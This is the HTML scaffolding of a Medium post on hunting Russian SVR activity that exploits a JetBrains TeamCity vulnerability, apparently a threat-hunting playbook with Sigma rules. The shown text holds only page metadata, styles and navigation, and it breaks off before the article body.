<!doctype html><html lang="en"><head><title data-rh="true">Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally | by SIMKRA | Jan, 2025 | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2025-01-03T18:19:32.176Z"/><meta data-rh="true" name="title" content="Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally | by SIMKRA | Jan, 2025 | Medium"/><meta data-rh="true" property="og:title" content="Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally"/><meta data-rh="true" property="al:android:url" content="medium://p/1b40810f8552"/><meta data-rh="true" property="al:ios:url" content="medium://p/1b40810f8552"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="The playbook is written based on the CISA Alert Code AA23–347A and contains corresponding Sigma Rules for threat hunting. It contains additionally a threat hunting Sigma Rule opportunity for living…"/><meta data-rh="true" property="og:description" content="Behavior Patterns"/><meta data-rh="true" property="og:url" content="https://medium.com/@simone.kraus/hunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552"/><meta data-rh="true" property="al:web:url" content="https://medium.com/@simone.kraus/hunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552"/><meta data-rh="true" property="article:author" content="https://medium.com/@simone.kraus"/><meta data-rh="true" name="author" content="SIMKRA"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/1b40810f8552"/><meta data-rh="true" property="twitter:description" content="Behavior Patterns"/><meta data-rh="true" name="twitter:card" content="summary"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="9 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@simone.kraus"/><link data-rh="true" rel="canonical" href="https://medium.com/@simone.kraus/hunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/1b40810f8552"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fda:true\u002Fbd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"url":"https:\u002F\u002Fmedium.com\u002F@simone.kraus\u002Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552","dateCreated":"2025-01-01T23:46:30.287Z","datePublished":"2025-01-01T23:46:30.287Z","dateModified":"2025-01-03T18:19:32.176Z","headline":"Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally","name":"Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally","description":"The playbook is written based on the CISA Alert Code AA23–347A and contains corresponding Sigma Rules for threat hunting. It contains additionally a threat hunting Sigma Rule opportunity for living…","identifier":"1b40810f8552","author":{"@type":"Person","name":"SIMKRA","url":"https:\u002F\u002Fmedium.com\u002F@simone.kraus"},"creator":["SIMKRA"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fmedium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fmedium.com\u002F@simone.kraus\u002Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552"}</script><style type="text/css" data-fela-rehydration="568" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="568" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fu{display:none}.ga{margin:0 24px}.ge{background:rgba(255, 255, 255, 1)}.gf{border:1px solid #F2F2F2}.gg{box-shadow:0 1px 4px #F2F2F2}.gh{max-height:100vh}.gi{overflow-y:auto}.gj{left:0}.gk{top:calc(100vh + 100px)}.gl{bottom:calc(100vh + 100px)}.gm{width:10px}.gn{pointer-events:none}.go{word-break:break-word}.gp{word-wrap:break-word}.gq:after{display:block}.gr:after{content:""}.gs:after{clear:both}.gt{line-height:1.23}.gu{letter-spacing:0}.gv{font-style:normal}.gw{font-weight:700}.hr{margin-bottom:-0.27em}.hs{line-height:1.394}.in{align-items:baseline}.io{width:48px}.ip{height:48px}.iq{border:2px solid rgba(255, 255, 255, 1)}.ir{z-index:0}.is{box-shadow:none}.it{border:1px solid rgba(0, 0, 0, 0.05)}.iu{margin-bottom:2px}.iv{flex-wrap:nowrap}.iw{font-size:16px}.ix{line-height:24px}.iz{margin:0 8px}.ja{display:inline}.jb{color:#1A8917}.jc{fill:#1A8917}.jf{flex:0 0 auto}.ji{flex-wrap:wrap}.jj{padding-left:8px}.jk{padding-right:8px}.kl> *{flex-shrink:0}.km{overflow-x:scroll}.kn::-webkit-scrollbar{display:none}.ko{scrollbar-width:none}.kp{-ms-overflow-style:none}.kq{width:74px}.kr{flex-direction:row}.ks{z-index:2}.kt{margin-right:4px}.kw{-webkit-user-select:none}.kx{border:0}.ky{fill:rgba(117, 117, 117, 1)}.lb{outline:0}.lc{user-select:none}.ld> svg{pointer-events:none}.lm{cursor:progress}.ln{opacity:1}.lo{padding:4px 0}.lr{margin-top:0px}.ls{width:16px}.lu{display:inline-flex}.ma{max-width:100%}.mb{padding:8px 2px}.mc svg{color:#6B6B6B}.mt{box-shadow:inset 3px 0 0 0 #242424}.mu{padding-left:23px}.mv{margin-left:-20px}.mw{line-height:1.58}.mx{letter-spacing:-0.004em}.my{font-style:italic}.mz{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.ns{margin-bottom:-0.46em}.nt{text-decoration:underline}.nu{line-height:1.18}.nv{letter-spacing:-0.022em}.nw{font-weight:600}.om{margin-bottom:-0.31em}.ox{overflow-x:auto}.oy{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.oz{padding:32px}.pa{border:1px solid #E5E5E5}.pb{line-height:1.4}.pc{margin-top:-0.2em}.pd{margin-bottom:-0.2em}.pe{white-space:pre}.pf{min-width:fit-content}.pg{margin-top:16px}.pm{box-shadow:inset 0 0 0 1px #F2F2F2}.pn{padding:0px}.po{padding:16px 20px}.pp{flex:1 1 auto}.pr{overflow:hidden}.ps{max-height:40px}.pt{text-overflow:ellipsis}.pu{display:-webkit-box}.pv{-webkit-line-clamp:2}.pw{-webkit-box-orient:vertical}.py{margin-top:8px}.pz{margin-top:12px}.qa{width:160px}.qb{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*x5quL_eA2uYcvZDO)}.qc{background-origin:border-box}.qd{background-size:cover}.qe{height:167px}.qf{background-position:50% 50%}.qg{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*bXjbNVLUoLtNMdfQ)}.qh{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*_UMpTa8D2WoWuQDJ)}.qi{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*vQ24-uQ9mf2E6I8P)}.qj{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*6MSP1IXkzImFeHHC)}.qk{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*HWHPWezwfiWRknk6)}.ql{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*hpzQEddLP7i1b8g4)}.qm{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*0Ck-DZXJsMiL2hS1)}.qn{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*fhFFfYZU6ifCbDyw)}.qo{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*uiD7R7-2qZDge6VI)}.qp{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*o-RNDYWtKS9cUvT6)}.qq{margin-left:auto}.qr{margin-right:auto}.qs{max-width:209px}.qt{clear:both}.qu{height:auto}.qv{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*qUHYjKojp3xCKVXt)}.qw{margin-bottom:26px}.qx{margin-top:6px}.qy{margin-right:8px}.qz{padding:8px 16px}.ra{border-radius:100px}.rb{transition:background 300ms ease}.rd{white-space:nowrap}.re{border-top:none}.rf{margin-bottom:14px}.rg{height:52px}.rh{max-height:52px}.ri{box-sizing:content-box}.rj{position:static}.rk{z-index:1}.rm{max-width:155px}.rs{margin-right:20px}.ry{height:0px}.rz{margin-bottom:40px}.so{height:64px}.sp{width:64px}.sq{align-self:flex-end}.sr{color:rgba(255, 255, 255, 1)}.ss{fill:rgba(255, 255, 255, 1)}.st{background:rgba(25, 25, 25, 1)}.su{border-color:rgba(25, 25, 25, 1)}.sx:disabled{opacity:0.1}.sy:disabled:hover{background:rgba(25, 25, 25, 1)}.sz:disabled:hover{border-color:rgba(25, 25, 25, 1)}.tf{padding-right:4px}.tg{font-weight:500}.tn{white-space:pre-wrap}.to{margin-bottom:54px}.uf{gap:18px}.ug{fill:rgba(61, 61, 61, 1)}.us{border-bottom:solid 1px #E5E5E5}.ut{margin-top:72px}.uu{padding:24px 0}.uv{margin-bottom:0px}.uw{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.iy:hover{text-decoration:underline}.jd:hover:not(:disabled){color:#156D12}.je:hover:not(:disabled){fill:#156D12}.la:hover{fill:rgba(8, 8, 8, 1)}.lp:hover{fill:#000000}.lq:hover p{color:#000000}.lt:hover{color:#000000}.md:hover svg{color:#000000}.rc:hover{background-color:#F2F2F2}.sn:hover{background-color:none}.sv:hover{background:#000000}.sw:hover{border-color:#242424}.uh:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.kz:focus{fill:rgba(8, 8, 8, 1)}.me:focus svg{color:#000000}.le:active{border-style:none}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fz{margin-bottom:68px}.gd{max-width:680px}.hn{font-size:42px}.ho{margin-top:1.19em}.hp{line-height:52px}.hq{letter-spacing:-0.011em}.if{font-size:22px}.ig{margin-top:0.92em}.ih{line-height:28px}.im{align-items:center}.jx{border-top:solid 1px #F2F2F2}.jy{border-bottom:solid 1px #F2F2F2}.jz{margin:32px 0 0}.ka{padding:3px 8px}.kj> *{margin-right:24px}.kk> :last-child{margin-right:0}.ll{margin-top:0px}.lz{margin:0}.no{font-size:20px}.np{margin-top:2.14em}.nq{line-height:32px}.nr{letter-spacing:-0.003em}.oj{margin-top:1.72em}.ok{line-height:24px}.ol{letter-spacing:0}.or{margin-top:0.94em}.ow{margin-top:56px}.pl{margin-top:32px}.rr{display:inline-block}.rx{margin-bottom:104px}.sa{flex-direction:row}.sd{margin-bottom:0}.se{margin-right:20px}.ta{max-width:500px}.tt{margin-bottom:72px}.uc{font-size:24px}.ud{line-height:30px}.ue{letter-spacing:-0.016em}.um{margin:40px 0 0}.ur{padding-top:72px}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.lk{margin-top:0px}.rq{display:inline-block}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lj{margin-top:0px}.rp{display:inline-block}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.lh{margin-top:0px}.li{margin-right:0px}.pq{padding:10px 12px 10px}.ro{display:inline-block}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fv{margin-bottom:4px}.gx{font-size:32px}.gy{margin-top:1.01em}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.ht{font-size:18px}.hu{margin-top:0.79em}.hv{line-height:24px}.ii{align-items:flex-start}.jg{flex-direction:column}.jl{margin:24px -24px 0}.jm{padding:0}.kb> *{margin-right:8px}.kc> :last-child{margin-right:24px}.ku{margin-left:0px}.lf{margin-top:0px}.lg{margin-right:0px}.lv{margin:0}.mf{border:1px solid #F2F2F2}.mg{border-radius:99em}.mh{padding:0px 16px 0px 12px}.mi{height:38px}.mj{align-items:center}.ml svg{margin-right:8px}.na{margin-top:1.56em}.nb{line-height:28px}.nc{letter-spacing:-0.003em}.nx{font-size:16px}.ny{margin-top:1.23em}.nz{letter-spacing:0}.on{margin-top:0.67em}.os{margin-top:40px}.ph{margin-top:24px}.rn{display:inline-block}.rt{margin-bottom:96px}.sl{margin-bottom:20px}.sm{margin-right:0}.te{max-width:100%}.th{font-size:24px}.ti{line-height:30px}.tj{letter-spacing:-0.016em}.tp{margin-bottom:64px}.tu{font-size:20px}.ui{margin:32px 0 0}.un{padding-top:48px}.mk:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fy{margin-bottom:68px}.gc{max-width:680px}.hj{font-size:42px}.hk{margin-top:1.19em}.hl{line-height:52px}.hm{letter-spacing:-0.011em}.ic{font-size:22px}.id{margin-top:0.92em}.ie{line-height:28px}.il{align-items:center}.jt{border-top:solid 1px #F2F2F2}.ju{border-bottom:solid 1px #F2F2F2}.jv{margin:32px 0 0}.jw{padding:3px 8px}.kh> *{margin-right:24px}.ki> :last-child{margin-right:0}.ly{margin:0}.nk{font-size:20px}.nl{margin-top:2.14em}.nm{line-height:32px}.nn{letter-spacing:-0.003em}.og{margin-top:1.72em}.oh{line-height:24px}.oi{letter-spacing:0}.oq{margin-top:0.94em}.ov{margin-top:56px}.pk{margin-top:32px}.rw{margin-bottom:104px}.sb{flex-direction:row}.sf{margin-bottom:0}.sg{margin-right:20px}.tb{max-width:500px}.ts{margin-bottom:72px}.tz{font-size:24px}.ua{line-height:30px}.ub{letter-spacing:-0.016em}.ul{margin:40px 0 0}.uq{padding-top:72px}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fx{margin-bottom:68px}.gb{max-width:680px}.hf{font-size:42px}.hg{margin-top:1.19em}.hh{line-height:52px}.hi{letter-spacing:-0.011em}.hz{font-size:22px}.ia{margin-top:0.92em}.ib{line-height:28px}.ik{align-items:center}.jp{border-top:solid 1px #F2F2F2}.jq{border-bottom:solid 1px #F2F2F2}.jr{margin:32px 0 0}.js{padding:3px 8px}.kf> *{margin-right:24px}.kg> :last-child{margin-right:0}.lx{margin:0}.ng{font-size:20px}.nh{margin-top:2.14em}.ni{line-height:32px}.nj{letter-spacing:-0.003em}.od{margin-top:1.72em}.oe{line-height:24px}.of{letter-spacing:0}.op{margin-top:0.94em}.ou{margin-top:56px}.pj{margin-top:32px}.rv{margin-bottom:104px}.sc{flex-direction:row}.sh{margin-bottom:0}.si{margin-right:20px}.tc{max-width:500px}.tr{margin-bottom:72px}.tw{font-size:24px}.tx{line-height:30px}.ty{letter-spacing:-0.016em}.uk{margin:40px 0 0}.up{padding-top:72px}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fw{margin-bottom:4px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{line-height:38px}.he{letter-spacing:-0.014em}.hw{font-size:18px}.hx{margin-top:0.79em}.hy{line-height:24px}.ij{align-items:flex-start}.jh{flex-direction:column}.jn{margin:24px 0 0}.jo{padding:0}.kd> *{margin-right:8px}.ke> :last-child{margin-right:8px}.kv{margin-left:0px}.lw{margin:0}.mm{border:1px solid #F2F2F2}.mn{border-radius:99em}.mo{padding:0px 16px 0px 12px}.mp{height:38px}.mq{align-items:center}.ms svg{margin-right:8px}.nd{margin-top:1.56em}.ne{line-height:28px}.nf{letter-spacing:-0.003em}.oa{font-size:16px}.ob{margin-top:1.23em}.oc{letter-spacing:0}.oo{margin-top:0.67em}.ot{margin-top:40px}.pi{margin-top:24px}.ru{margin-bottom:96px}.sj{margin-bottom:20px}.sk{margin-right:0}.td{max-width:100%}.tk{font-size:24px}.tl{line-height:30px}.tm{letter-spacing:-0.016em}.tq{margin-bottom:64px}.tv{font-size:20px}.uj{margin:32px 0 0}.uo{padding-top:48px}.mr:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="print">.rl{display:none}</style><style type="text/css" data-fela-rehydration="568" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.px{max-height:none}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F1b40810f8552&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40simone.kraus%2Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="/?source=---top_nav_layout_nav----------------------------------"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 